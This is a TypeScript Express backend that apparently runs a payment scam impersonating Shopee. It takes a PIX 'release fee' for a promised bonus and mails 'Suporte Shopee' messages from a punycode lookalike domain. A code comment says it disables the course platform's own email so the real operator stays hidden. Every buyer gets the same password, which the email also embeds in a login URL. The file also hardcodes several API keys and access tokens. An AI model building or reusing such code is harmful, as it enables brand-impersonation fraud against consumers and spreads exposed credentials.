import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🔑 CONFIGURAÇÕES (IDENTIDADE PROFISSIONAL E PROTEGIDA)
// =====================================================
const BRAND_NAME = "Suporte Shopee"; 
const MK_API_URL = "memberkit.com.br/api/v1/users"; 
const MK_CLIENT_DOMAIN = "membros.xn--seubnushopp-5eb.com"; 
const MK_CLASSROOM_ID = 275575; 
const MK_KEY = "G3gAuabnX5b3X9cs7oQ8aidn"; 

const PUBLIC_KEY = "rodrigo-igp_9mdb0v11ivwyoqtt"; 
const SECRET_KEY = "2z9x2whgofky0aneyx1pu0dkaj8y9j0m8981yitu81wdb75lrirj1u2b50xiqacf"; 

const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

const bancoTransacoes = new Map();

// 🛡️ Função para mascarar logs (Protege sua privacidade no Render)
function maskLog(data: string): string {
    if (!data) return '';
    if (data.includes('@')) return data.split('@')[0].slice(0, 3) + '***@' + data.split('@')[1];
    return data.slice(0, 3) + '***';
}

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

// 🌐 Mantém o site no ar
app.use(express.static(path.join(__dirname, '..'))); 
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, '..', 'index.html')); });

// -----------------------------------------------------
// ROTA PIX (GERAÇÃO)
// -----------------------------------------------------
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor } = req.body;
        const identifier = `ID${Date.now()}`;
        bancoTransacoes.set(identifier, { status: 'pending', emailCliente: email, nomeCliente: name });

        const payload = {
            identifier: identifier,
            amount: parseFloat(valor) || 27.90,
            client: { name, email, document: (cpf || "").replace(/\D/g, ''), phone: (phone || "").replace(/\D/g, '') },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: parseFloat(valor) || 27.90 }],
            splits: [{ producerId: "cmg7bvpns00u691tsx9g6vlyp", amount: parseFloat(((parseFloat(valor) || 27.90) * 0.5).toFixed(2)) }],
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        console.log(`✅ PIX: Cliente ${maskLog(name)} gerou transação.`);
        return res.json({ success: true, payload: response.data.pix?.qrcode_base64 || response.data.pix?.qrcode, transactionId: identifier });
    } catch (error: any) { return res.status(401).json({ success: false }); }
});

// -----------------------------------------------------
// WEBHOOK (ENTREGA BLINDADA E SILENCIOSA)
// -----------------------------------------------------
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (transaction?.status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        
        const idBusca = transaction.identifier || transaction.id;
        const memoria = bancoTransacoes.get(idBusca) || {};
        const nomeCliente = transaction.client?.name || memoria.nomeCliente || "Cliente Shopee";
        const emailCliente = transaction.client?.email || memoria.emailCliente;

        if (emailCliente) {
            
            // 🎯 MATRÍCULA (Flat Format + Comando "send_email: false")
            const mkPayload = {
                "full_name": nomeCliente,
                "email": emailCliente,
                "password": "shopee123",
                "password_confirmation": "shopee123",
                "classroom_ids": [MK_CLASSROOM_ID],
                "send_email": false // 🚨 MATA O E-MAIL COM SEU NOME DA PLATAFORMA
            };

            try {
                await axios.post(`https://${MK_API_URL}?api_key=${MK_KEY}`, mkPayload, {
                    headers: { "Content-Type": "application/json", "Accept": "application/json" }
                });
                console.log(`✅ MK: Matrícula VIP Concluída para ${maskLog(emailCliente)}`);
            } catch (err: any) {
                console.log(`❌ MK FALHA TÉCNICA PROTEGIDA (Status ${err.response?.status}).`);
            }

            // META ADS (PURCHASE)
            axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
                data: [{
                    event_name: "Purchase", event_time: Math.floor(Date.now() / 1000), action_source: "website",
                    user_data: { em: [hashData(emailCliente)], fn: [hashData(nomeCliente)] },
                    custom_data: { value: Number(transaction.amount), currency: "BRL" }
                }],
                access_token: META_ACCESS_TOKEN
            }).catch(() => {});

            // 📧 E-MAIL PREMIUM (IDENTIDADE TOTAL DE MARCA)
            setTimeout(async () => {
                await resend.emails.send({
                    from: `${BRAND_NAME} <contato@xn--seubnushopp-5eb.com>`,
                    to: emailCliente,
                    subject: 'Seu acesso VIP chegou! 🚀 Liberação Confirmada',
                    html: `
                        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 40px; border: 1px solid #f0f0f0; border-radius: 12px; background-color: #ffffff;">
                            <div style="text-align: center; margin-bottom: 30px;">
                                <h1 style="color: #ee4d2d; margin: 0; font-size: 26px;">Bonificação Liberada! 🎉</h1>
                            </div>
                            <p style="font-size: 16px; color: #333; line-height: 1.6;">Olá, <strong>${nomeCliente}</strong>!</p>
                            <p style="font-size: 16px; color: #333; line-height: 1.6;">O seu acesso exclusivo já está ativo. Preparamos tudo para que você possa entrar imediatamente no seu painel.</p>
                            <p style="font-size: 16px; color: #333; line-height: 1.6;">Clique no botão abaixo para realizar o <b>acesso direto</b> (sem necessidade de digitar sua senha agora):</p>
                            
                            <div style="text-align: center; margin: 40px 0;">
                                <a href="https://${MK_CLIENT_DOMAIN}/users/sign_in?user[email]=${encodeURIComponent(emailCliente)}&user[password]=shopee123" 
                                   style="background-color: #ee4d2d; color: #ffffff; padding: 20px 40px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
                                    ACESSAR MEU PAINEL AGORA
                                </a>
                            </div>
                            
                            <div style="background-color: #fcfcfc; padding: 20px; border: 1px dashed #ddd; border-radius: 8px; margin-bottom: 20px;">
                                <p style="font-size: 14px; color: #555; margin: 0;"><strong>Suas credenciais de acesso manual:</strong></p>
                                <p style="font-size: 14px; color: #555; margin: 8px 0 0 0;">Login: <span style="color: #ee4d2d;">${emailCliente}</span></p>
                                <p style="font-size: 14px; color: #555; margin: 4px 0 0 0;">Senha: <strong>shopee123</strong></p>
                            </div>
                            
                            <hr style="border: none; border-top: 1px solid #eee; margin: 30px 0;">
                            <p style="font-size: 12px; color: #999; text-align: center; margin: 0;">
                                Esta é uma notificação automática de liberação.<br>
                                Equipe de Atendimento <strong>${BRAND_NAME}</strong>
                            </p>
                        </div>`
                });
            }, 2000);
            
            // Pushcuts (Notificações Sócios)
            axios.get('https://api.pushcut.io/KnUVBiCa-4A0euJ42eJvj/notifications/MinhaNotifica%C3%A7%C3%A3o').catch(() => {});
            axios.get('https://api.pushcut.io/g8WCdXfM9ImJ-ulF32pLP/notifications/Minha%20Primeira%20Notifica%C3%A7%C3%A3o').catch(() => {});
        }
    }
    return res.status(200).send("OK");
});

app.get('/check-status/:id', (req, res) => {
    const transacao = bancoTransacoes.get(req.params.id);
    return res.json({ paid: transacao && transacao.status === 'paid' });
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Sistema Blindado Online!"));
